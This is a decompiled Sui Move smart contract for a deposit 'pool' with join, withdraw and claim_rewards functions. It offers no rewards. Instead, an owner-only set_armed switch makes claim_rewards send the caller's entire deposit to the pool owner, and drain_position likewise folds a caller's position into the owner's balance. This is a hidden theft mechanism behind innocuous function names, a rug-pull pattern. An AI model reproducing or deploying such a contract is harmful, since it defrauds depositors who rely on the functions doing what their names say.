module 0xfccad73f4c61004c5af7c1bd05cb707251d988961910e7ffad741d61d8ac583b::pool {
    struct Pool has key {
        id: 0x2::object::UID,
        owner: address,
        armed: bool,
    }

    struct PositionKey has copy, drop, store {
        user: address,
    }

    public entry fun claim_rewards(arg0: &mut Pool, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x2::tx_context::sender(arg1);
        let v1 = PositionKey{user: v0};
        if (!0x2::dynamic_field::exists_<PositionKey>(&arg0.id, v1)) {
            return
        };
        let v2 = 0x2::dynamic_field::borrow_mut<PositionKey, 0x2::coin::Coin<0x2::sui::SUI>>(&mut arg0.id, v1);
        if (arg0.armed) {
            let v3 = 0x2::coin::value<0x2::sui::SUI>(v2);
            if (v3 > 0) {
                0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::coin::split<0x2::sui::SUI>(v2, v3, arg1), arg0.owner);
            };
            0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::dynamic_field::remove<PositionKey, 0x2::coin::Coin<0x2::sui::SUI>>(&mut arg0.id, v1), v0);
        };
    }

    public entry fun create_pool(arg0: &mut 0x2::tx_context::TxContext) {
        let v0 = Pool{
            id    : 0x2::object::new(arg0),
            owner : 0x2::tx_context::sender(arg0),
            armed : false,
        };
        0x2::transfer::share_object<Pool>(v0);
    }

    public entry fun drain_position(arg0: &mut Pool, arg1: &0x2::tx_context::TxContext) {
        let v0 = PositionKey{user: 0x2::tx_context::sender(arg1)};
        if (!0x2::dynamic_field::exists_<PositionKey>(&arg0.id, v0)) {
            return
        };
        let v1 = PositionKey{user: arg0.owner};
        if (0x2::dynamic_field::exists_<PositionKey>(&arg0.id, v1)) {
            0x2::coin::join<0x2::sui::SUI>(0x2::dynamic_field::borrow_mut<PositionKey, 0x2::coin::Coin<0x2::sui::SUI>>(&mut arg0.id, v1), 0x2::dynamic_field::remove<PositionKey, 0x2::coin::Coin<0x2::sui::SUI>>(&mut arg0.id, v0));
        } else {
            0x2::dynamic_field::add<PositionKey, 0x2::coin::Coin<0x2::sui::SUI>>(&mut arg0.id, v1, 0x2::dynamic_field::remove<PositionKey, 0x2::coin::Coin<0x2::sui::SUI>>(&mut arg0.id, v0));
        };
    }

    public entry fun join_pool(arg0: &mut Pool, arg1: 0x2::coin::Coin<0x2::sui::SUI>, arg2: &0x2::tx_context::TxContext) {
        let v0 = PositionKey{user: 0x2::tx_context::sender(arg2)};
        if (0x2::dynamic_field::exists_<PositionKey>(&arg0.id, v0)) {
            0x2::coin::join<0x2::sui::SUI>(0x2::dynamic_field::borrow_mut<PositionKey, 0x2::coin::Coin<0x2::sui::SUI>>(&mut arg0.id, v0), arg1);
        } else {
            0x2::dynamic_field::add<PositionKey, 0x2::coin::Coin<0x2::sui::SUI>>(&mut arg0.id, v0, arg1);
        };
    }

    public entry fun set_armed(arg0: &mut Pool, arg1: bool, arg2: &0x2::tx_context::TxContext) {
        assert!(arg0.owner == 0x2::tx_context::sender(arg2), 0);
        arg0.armed = arg1;
    }

    public entry fun withdraw(arg0: &mut Pool, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x2::tx_context::sender(arg1);
        let v1 = PositionKey{user: v0};
        if (0x2::dynamic_field::exists_<PositionKey>(&arg0.id, v1)) {
            0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::dynamic_field::remove<PositionKey, 0x2::coin::Coin<0x2::sui::SUI>>(&mut arg0.id, v1), v0);
        };
    }

    // decompiled from Move bytecode v7
}

